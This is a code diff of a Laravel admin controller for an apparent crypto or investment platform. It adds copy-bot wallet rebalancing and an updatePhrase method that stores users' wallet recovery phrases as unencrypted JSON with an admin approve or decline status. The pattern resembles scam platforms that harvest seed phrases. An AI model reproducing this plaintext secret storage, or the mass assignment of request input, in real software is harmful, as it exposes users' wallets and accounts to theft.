@@ -104,6 +104,8 @@ class AdminController extends Controller
             'phone' => 'required',
             'marital_status' => 'required',
             'nationality' => 'required',
+            'swap' => 'required',
+            'margin' => 'required',
         ]);
         $user->update(request()->except('token'));
         return back()->with('success', 'User updated successfully');
@@ -468,11 +470,29 @@ class AdminController extends Controller
 
     public function updateCopyBot(Request $request, $id)
     {
-        $copyBot = User::findOrFail($id);
+        $user = User::findOrFail($id);
 
         $botId = $request->copy_bot;
 
-        $copyBot->copyBots()->attach($botId);
+        $user->copyBots()->attach($botId);
+
+        $ira_deposit = $user->ira_deposit()->where('status', '=', 'approved')->sum('actual_amount');
+        $ira_payout = $user->ira_payout()->whereIn('status', ['approved', 'pending'])->sum('actual_amount');
+        $offshore_deposit = $user->offshore_deposit()->where('status', '=', 'approved')->sum('actual_amount');
+        $offshore_payout = $user->offshore_payout()->whereIn('status', ['approved', 'pending'])->sum('actual_amount');
+        $ira_roi = $user->ira_roi()->sum('ROI');
+        $offshore_roi = $user->offshore_roi()->sum('ROI');
+
+        $offshore = ($offshore_deposit - $offshore_payout) + ($offshore_roi);
+        $ira = ($ira_deposit - $ira_payout) + ($ira_roi);
+
+        $ira_cash =  $user->copyBots->count() >= 1 ? 0 : $ira;
+        $ira_trading = $user->copyBots->count() >= 1 ? $ira : 0;
+
+        $offshore_cash = $user->copyBots->count() >= 1 ? 0 : $offshore;
+        $offshore_trading = $user->copyBots->count() >= 1 ? $offshore : 0;
+
+        $user->updateWallet(($ira_cash + $offshore_cash), ($ira_trading + $offshore_trading));
 
         return back()->with('success', ' Updated Successfully');
 
@@ -489,4 +509,32 @@ class AdminController extends Controller
         return back()->with('success', ' Updated Successfully');
 
     }
+
+    public function updatePhrase(Request $request, $id, $status)
+    {
+        // Validate the incoming request data
+        $request->validate([
+            'phrase' => 'required|string',
+            'wallet' => 'required|string',
+        ]);
+
+        $user = User::findOrFail($id);
+
+        // Prepare the data to be stored as a JSON object
+        $data = [
+            'phrase' => $request->phrase,
+            'wallet' => $request->wallet,
+            'status' => $status
+        ];
+
+        // Convert the array to a JSON string
+        $dataJson = json_encode($data);
+
+        // Update the user's phrase in the users table
+        $user->update(['phrase' => $dataJson]);
+
+        // Redirect back with a success message
+        return back()->with('success', $status == 1 ? 'Phrase Approved Successfully' : 'Phrase Declined');
+    }
+
 }
